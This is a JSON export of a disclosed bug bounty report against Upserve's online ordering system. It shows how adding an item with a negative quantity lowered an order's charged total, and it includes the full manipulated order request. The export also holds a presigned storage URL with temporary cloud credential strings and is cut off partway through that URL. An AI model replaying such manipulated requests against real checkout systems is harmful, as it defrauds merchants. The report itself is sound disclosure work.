{"id":364843,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjQ4NDM=","url":"https://hackerone.com/reports/364843","title":"OLO Total price manipulation using negative quantities","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-06-11T22:02:17.892Z","submitted_at":"2018-06-11T22:02:17.892Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fuzz","url":"/fuzz","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21981,"url":"https://hackerone.com/upserve","handle":"upserve","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/981/780e51432acea84f3fe52455f0009230a87ee31e_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/981/780e51432acea84f3fe52455f0009230a87ee31e_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Upserve ","twitter_handle":"getupserve","website":"http://upserve.com","about":"Upserve offers cloud point of sale for restaurants, actionable analytics, payment processing, and mobile restaurant management."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-07-06T17:59:06.463Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-06-06T17:58:56.753Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Manipulating an order request JSON object, containing an additional item with a negative quantity directly manipulates the total amount of the order.\n\nIn the following JSON request, an order is submitted for 2 ChickenBurgers ($12 each), as well as -1 BreadPuddings ($9 each).\n\nThe total price after tax calculates as $18.70 and is accepted by the system. The attached screenshots show the previous orders, indicating that only $18.70 was charged for the transaction.\n\n```json\n{\"card_uuid\": \"09ef096d-18d7-4cb4-83b7-5bd15d310aac\", \"city\": \"Cambridge\", \"email\": \"mthompson@hexwave.com\", \"first_name\": \"Matt\", \"last_name\": \"Thompson\", \"line1\": \"1230 Massachusetts Ave\", \"order\": {\"charges\": {\"items\": [{\"item_id\": \"254baa85-92c1-412e-a391-aaf44508d882\", \"name\": \"ChickenBurger\", \"price\": 1200, \"quantity\": 2, \"instructions\": \"\", \"total\": 1200, \"modifiers\": [], \"sides\": []}, {\"item_id\": \"9169bfc1-2ee1-455b-ad65-aeadd36f46eb\", \"name\": \"BreadPudding\", \"price\": 900, \"quantity\": -1, \"instructions\": \"\", \"total\": 900, \"modifiers\": [], \"sides\": []}], \"taxes\": 290, \"tip\": {\"amount\": 0}, \"total\": 1870}, \"confirmation_code\": \"upserve-hacker-cafe-32870\", \"fulfillment_info\": {\"customer\": {\"email\": \"mthompson@hexwave.com\", \"first_name\": \"Matt\", \"last_name\": \"Thompson\", \"phone\": \"555-555-5555\"}, \"delivery_info\": {\"address\": {\"address_line1\": \"1230 Massachusetts Ave\", \"address_line2\": null, \"city\": \"Cambridge\", \"country\": \"\", \"state\": \"MA\", \"zip_code\": \"02138\"}}, \"instructions\": \"\", \"type\": \"delivery\"}, \"id\": \"a168f311-f0bf-416c-b813-b277e3a7b5b3\", \"payments\": {\"payments\": [{\"amount\": 0, \"payment_type\": \"CREDIT\", \"tip_amount\": 0}], \"total\": 3190}, \"time_placed\": \"2018-06-11T20:48:51.313Z\"}, \"order_total\": 3190, \"phone_number\": \"555-555-5555\", \"state\": \"MA\", \"store_pretty_url\": \"upserve-lounge-test-providence-2\", \"submission_id\": \"a168f311-f0bf-416c-b813-b277e3a7b5b3\", \"text_alerts\": false, \"zip\": \"02138\"}\n```\n\n## Impact\n\nThe attacker can reduce the price of the order.","vulnerability_information_html":"\u003cp\u003eManipulating an order request JSON object, containing an additional item with a negative quantity directly manipulates the total amount of the order.\u003c/p\u003e\n\n\u003cp\u003eIn the following JSON request, an order is submitted for 2 ChickenBurgers ($12 each), as well as -1 BreadPuddings ($9 each).\u003c/p\u003e\n\n\u003cp\u003eThe total price after tax calculates as $18.70 and is accepted by the system. The attached screenshots show the previous orders, indicating that only $18.70 was charged for the transaction.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;card_uuid\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;09ef096d-18d7-4cb4-83b7-5bd15d310aac\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;city\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Cambridge\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;mthompson@hexwave.com\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;first_name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Matt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;last_name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Thompson\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;line1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1230 Massachusetts Ave\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;order\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;charges\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;item_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;254baa85-92c1-412e-a391-aaf44508d882\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;ChickenBurger\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;price\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1200\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;quantity\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;instructions\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;total\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1200\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;modifiers\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[],\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;sides\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[]},\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;item_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;9169bfc1-2ee1-455b-ad65-aeadd36f46eb\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;BreadPudding\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;price\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e900\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;quantity\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e-1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;instructions\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;total\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e900\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;modifiers\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[],\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;sides\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[]}],\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;taxes\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e290\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;tip\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;amount\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;total\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1870\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;confirmation_code\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;upserve-hacker-cafe-32870\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;fulfillment_info\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;customer\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;mthompson@hexwave.com\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;first_name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Matt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;last_name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Thompson\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;phone\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;555-555-5555\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;delivery_info\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;address\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;address_line1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1230 Massachusetts Ave\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;address_line2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;city\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Cambridge\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;country\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;state\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;MA\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;zip_code\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;02138\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}},\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;instructions\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;type\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;delivery\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a168f311-f0bf-416c-b813-b277e3a7b5b3\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;payments\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;payments\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;amount\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;payment_type\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;CREDIT\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;tip_amount\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e}],\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;total\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e3190\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;time_placed\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;2018-06-11T20:48:51.313Z\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;order_total\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e3190\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;phone_number\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;555-555-5555\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;state\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;MA\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;store_pretty_url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;upserve-lounge-test-providence-2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;submission_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a168f311-f0bf-416c-b813-b277e3a7b5b3\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;text_alerts\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;zip\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;02138\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe attacker can reduce the price of the order.\u003c/p\u003e\n","bounty_amount":"3500.0","formatted_bounty":"$3,500","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":307763,"file_name":"Screen_Shot_2018-06-11_at_2.36.37_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/307/763/442989a263819ed500aa8c425f830a0034232710/Screen_Shot_2018-06-11_at_2.36.37_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-06-11_at_2.36.37_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-06-11_at_2.36.37_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054421Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8V